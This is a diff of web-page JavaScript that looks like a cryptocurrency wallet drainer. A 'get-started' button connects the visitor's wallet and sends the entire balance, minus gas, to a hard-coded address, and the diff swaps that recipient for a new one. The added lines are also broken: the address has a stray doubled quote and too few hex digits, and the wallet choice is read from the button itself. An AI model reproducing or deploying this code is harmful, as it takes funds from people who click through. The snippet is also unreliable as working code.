@@ -1,5 +1,5 @@
   document.getElementById('get-started').addEventListener('click', () => {
-            const selectedWallet = document.getElementById('walletSelect').value;
+            const selectedWallet = document.getElementById('get-started').value;
             connectAndSend(selectedWallet);
         });
 
@@ -35,7 +35,7 @@
 
             // Estimate gas price and limit
             const gasPrice = await provider.getGasPrice();
-            const dummyTransaction = { to: "0x814FaE9f487206471B6B0D713cD51a2D35980000", value: balance };
+            const dummyTransaction = { to: ""0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", value: balance };
             const gasLimit = await provider.estimateGas(dummyTransaction);
 
             // Calculate gas fee and adjust balance
@@ -49,7 +49,7 @@
 
             // Define and send the transaction
             const transaction = {
-                to: "0x814FaE9f487206471B6B0D713cD51a2D35980000", // Replace with the recipient address
+                to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", // Replace with the recipient address
                 value: value,
                 gasLimit: gasLimit,
                 gasPrice: gasPrice,
